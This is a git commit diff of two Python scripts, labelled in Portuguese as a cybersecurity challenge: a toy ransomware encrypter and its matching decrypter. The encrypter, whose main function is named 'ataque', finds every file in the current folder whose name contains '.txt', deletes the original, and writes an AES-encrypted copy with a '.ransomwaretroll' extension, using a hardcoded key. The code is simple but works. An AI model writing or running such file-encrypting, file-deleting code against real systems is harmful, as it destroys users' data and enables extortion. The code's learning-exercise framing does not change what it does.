17bcebf989cad645e5d3e4b746e5f4eef4955d13
bruno-alexander <brunojaquesm@gmail.com>
2025-01-06 14:55:39 -0300

    Add files via upload

--- decrypter.py
+++ decrypter.py
@@ -1,22 +1,39 @@
+## codigo descriptografia -- desafio ciberseguranca
+
+## importacoes
 import os
 import pyaes
+## definicao variaveis
+lista_arquivos = os.listdir('.')
+arquivos_txt = []
+## chave descriptografia
+chave = b"testeransomwares"
+aes = pyaes.AESModeOfOperationCTR(chave)
+## busca arquivos
+def busca_txt(lista_arquivos):
+	for arquivo in lista_arquivos:
+		if "txt.ransomwaretroll" in arquivo:
+			arquivos_txt.append(arquivo)
+	return arquivos_txt
+## resolucao
+def resolucao():
+	for txt in arquivos_txt:
+		## abrir arquivo criptografado
+		file = open(txt, "rb")
+		file_data = file.read()
+		file.close()
+		## remover criptografia
+		decrypt_data = aes.decrypt(file_data)
+		## remover arquivo criptografado
+		os.remove(txt)
+		## criar arquivo descriptografado
+		new_file = txt.replace(".ransomwaretroll","")
+		new_file = open(f'{new_file}', "wb")
+		new_file.write(decrypt_data)
+		new_file.close()
+## ponto de entrada
+if __name__ == "__main__":
+	arquivos_txt = busca_txt(lista_arquivos)
+	resolucao ()
 
-## abrir o arquivo criptografado
-file_name = "teste.txt.ransomwaretroll"
-file = open(file_name, "rb")
-file_data = file.read()
-file.close()
 
-## chave para descriptografia
-key = b"testeransomwares"
-aes = pyaes.AESModeOfOperationCTR(key)
-decrypt_data = aes.decrypt(file_data)
-
-## remover o arquivo criptografado
-os.remove(file_name)
-
-## criar o arquivo descriptografado
-new_file = "teste.txt"
-new_file = open(f'{new_file}', "wb")
-new_file.write(decrypt_data)
-new_file.close()
--- encrypter.py
+++ encrypter.py
@@ -1,24 +1,38 @@
+## codigo criptografia de arquivos txt - desafio ciberseguranca
+
+## importacoes
 import os
 import pyaes
-
-## abrir o arquivo a ser criptografado
-file_name = "teste.txt"
-file = open(file_name, "rb")
-file_data = file.read()
-file.close()
-
-## remover o arquivo
-os.remove(file_name)
-
+## definicao de variaveis
+lista_arquivos = os.listdir('.')
+arquivos_txt = []
 ## chave de criptografia
-key = b"testeransomwares"
-aes = pyaes.AESModeOfOperationCTR(key)
-
-## criptografar o arquivo
-crypto_data = aes.encrypt(file_data)
-
-## salvar o arquivo criptografado
-new_file = file_name + ".ransomwaretroll"
-new_file = open(f'{new_file}','wb')
-new_file.write(crypto_data)
-new_file.close()
+chave = b"testeransomwares"
+aes = pyaes.AESModeOfOperationCTR(chave)
+## buscar arquivos txt
+def busca_txt(lista_arquivos):
+	for arquivo in lista_arquivos:
+		if ".txt" in arquivo:
+			arquivos_txt.append(arquivo)
+	return arquivos_txt
+## ataque
+def ataque ():
+	for txt in arquivos_txt:
+		## abrir arquivo
+		file = open(txt, "rb")
+		## gravar conteudo
+		file_data = file.read()
+		file.close()
+		## remover arquivo
+		os.remove(txt)
+		## criptografar arquivo
+		crypto_data = aes.encrypt(file_data)
+		## salvar arquivo criptografado
+		new_file = txt + ".ransomwaretroll"
+		new_file = open(f'{new_file}','wb')
+		new_file.write(crypto_data)
+		new_file.close()
+## ponto de entrada
+if __name__ == "__main__":
+	arquivos_txt = busca_txt(lista_arquivos)
+	ataque ()
